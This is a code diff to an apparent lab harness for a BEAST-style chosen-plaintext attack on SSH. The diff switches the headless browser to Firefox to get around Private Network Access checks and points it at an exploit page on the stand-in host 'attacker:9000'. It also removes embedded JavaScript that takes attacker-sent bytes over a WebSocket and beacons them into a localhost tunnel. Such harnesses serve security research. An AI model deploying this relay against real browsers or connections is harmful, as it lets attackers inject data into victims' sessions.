@@ -627,28 +627,23 @@ class SSHState:
     # -- Browser automation (BEAST variant) ------------------------------------
 
     async def launch_browser(self) -> None:
-        """Launch headless Chromium and navigate to the local exploit page.
+        """Launch headless Firefox and load the attacker's exploit page.
 
-        The page is served from the client's own HTTP API on localhost so
-        that ``sendBeacon('http://localhost:6379', ...)`` is a local-to-
-        local request, avoiding Private Network Access restrictions
-        without any Chrome flags.
+        Firefox is used because Chromium/WebKit PNA would preflight the
+        cross-origin sendBeacon to the loopback tunnel and strip its body.
         """
         from playwright.async_api import async_playwright
 
         self._playwright = await async_playwright().start()
-        self._browser = await self._playwright.chromium.launch(
-            headless=True,
-            args=["--no-sandbox", "--disable-dev-shm-usage"],
-        )
+        self._browser = await self._playwright.firefox.launch(headless=True)
         page = await self._browser.new_page()
 
-        exploit_url = f"http://localhost:{HTTP_PORT}/exploit"
+        exploit_url = "http://attacker:9000/exploit"
         for attempt in range(1, 61):
             try:
                 resp = await page.goto(exploit_url, timeout=5000)
                 if resp and resp.ok:
-                    LOG.info("browser loaded exploit page from localhost")
+                    LOG.info("browser loaded exploit page from attacker")
                     return
             except Exception as exc:  # noqa: BLE001
                 if attempt % 10 == 0:
@@ -705,47 +700,6 @@ class SSHState:
 # ---------------------------------------------------------------------------
 # HTTP control plane
 # ---------------------------------------------------------------------------
-
-_EXPLOIT_HTML = """\
-<!DOCTYPE html>
-<html>
-<head><title>Loading...</title></head>
-<body>
-<p id="status">Connecting...</p>
-<script>
-var TUNNEL = 'http://localhost:6379';
-var WS_URL = 'ws://attacker:9000/ws';
-var ws;
-function connect() {
-    ws = new WebSocket(WS_URL);
-    ws.onopen = function() {
-        document.getElementById('status').textContent = 'Connected';
-        ws.send(JSON.stringify({ cmd: 'ready' }));
-    };
-    ws.onmessage = function(event) {
-        var msg = JSON.parse(event.data);
-        if (msg.cmd === 'fetch') {
-            var raw = atob(msg.body);
-            var body = new Uint8Array(raw.length);
-            for (var i = 0; i < raw.length; i++) body[i] = raw.charCodeAt(i);
-            navigator.sendBeacon(TUNNEL, new Blob([body], {type: 'text/plain'}));
-            ws.send(JSON.stringify({ cmd: 'done', id: msg.id }));
-        }
-    };
-    ws.onclose = function() {
-        document.getElementById('status').textContent = 'Reconnecting...';
-        setTimeout(connect, 1000);
-    };
-}
-connect();
-</script>
-</body>
-</html>
-"""
-
-
-async def handle_exploit(request: web.Request) -> web.Response:
-    return web.Response(text=_EXPLOIT_HTML, content_type="text/html")
 
 
 async def handle_status(request: web.Request) -> web.Response:
@@ -872,7 +826,6 @@ async def main() -> int:
 
     app = web.Application()
     app["ssh"] = state
-    app.router.add_get("/exploit", handle_exploit)
     app.router.add_get("/status", handle_status)
     app.router.add_post("/send_secret", handle_send_secret)
     app.router.add_post("/set_secret", handle_set_secret)
